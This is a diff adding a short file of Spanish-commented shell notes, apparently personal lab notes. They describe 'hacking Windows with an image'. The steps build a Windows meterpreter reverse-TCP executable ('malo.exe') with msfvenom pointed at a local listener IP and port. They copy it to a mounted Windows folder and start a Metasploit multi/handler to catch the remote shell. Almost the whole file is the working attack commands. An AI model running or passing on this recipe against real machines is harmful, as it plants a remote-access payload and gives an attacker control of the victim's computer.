@@ -1,0 +1,33 @@
+
+
+#jaquear con una imagen en Windows
+sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.183 LPORT=4444 -f exe > malo.exe
+
+#visualizar donde lo creo
+ls -l malo.exe
+
+#validar carpeta
+pwd
+
+#copiar a windows "cp origen destino"
+sudo cp /home/jag/malo.exe /mnt/externo/cargaM
+
+#ejecutar msfconsole
+sudo msfconsole
+
+#
+use exploit/multi/handler
+
+
+
+exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+
+set LHOST=192.168.1.183 
+set LPORT=4444
+
+show options
+
+run
+
+
+
